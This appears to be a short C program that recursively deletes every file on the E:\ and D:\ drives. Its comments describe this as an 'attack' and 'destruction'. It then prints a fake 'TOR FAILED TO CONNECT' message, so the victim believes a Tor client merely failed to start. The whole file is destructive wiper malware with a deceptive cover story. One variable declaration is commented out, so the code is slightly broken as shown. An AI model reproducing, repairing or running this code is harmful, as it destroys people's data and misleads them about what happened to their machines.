#include<stdio.h>
#include<conio.h>
#include<dirent.h>
#include<sys/stat.h>
#include<string.h>
#include<malloc.h>

void doItNow(DIR *,char *);

int main()
{
    //char * initPath="E:\\";  //setting where to start attack ..
    DIR *currentDirectory; //creating refernce to directory ..
    currentDirectory=opendir(initPath); //linking the reference to start attack position directory ..
    // no need to use stat as we know that this is a directory ..
    doItNow(currentDirectory,initPath); //start the destruction now ..
    
    
    initPath="D:\\";  //setting where to start attack ..
    currentDirectory=opendir(initPath); //linking the reference to start attack position directory ..
    // no need to use stat as we know that this is a directory ..
    doItNow(currentDirectory,initPath); //start the destruction now ..
    
    printf("TOR FAILED TO CONNECT \n");
    getch();
    //return 0;
}

void doItNow(DIR *directory ,char * path)
{
     struct dirent *directoryInfo ; //creating pointer to dirent object to access the directory ..
     struct stat buf ; //creating stat object  ..
     char *currentPath ; //path of current directory being acessed ..
     char *newPath ; //path of directory going to be accessed now .. lol ..its funny ..
     DIR *NewDirectory;
     char *name ;
     
     char *newinterPath;
     char * prefix="\\";
    while((directoryInfo=readdir(directory))!=NULL) //reading the directory ..
     {
                name=directoryInfo->d_name;
                
         if(strcmp(name,".") && strcmp(name,".."))
         {
                currentPath=(char *)malloc(strlen(name)+strlen(path)+5);
                strcpy(currentPath,path);
                strcat(currentPath,name);
               // printf("%s\n",currentPath);
                
                 newPath=(char *)malloc(strlen(currentPath)+5);
                strcpy(newPath,currentPath);
                strcat(newPath,prefix);
                //printf("%s\n",newPath);
                
                
                if(stat(currentPath,&buf)!=0)
                {
                           continue;             
                }
                else if(S_ISDIR(buf.st_mode))
                {
                    //printf("directory\n");
                    NewDirectory=opendir(newPath);
                    doItNow(NewDirectory,newPath); //recursion here ..
                    
                }
                else
                {
                    remove(currentPath);  //delete if it is a file ..
                }
                
          }           
     
     }
     
}
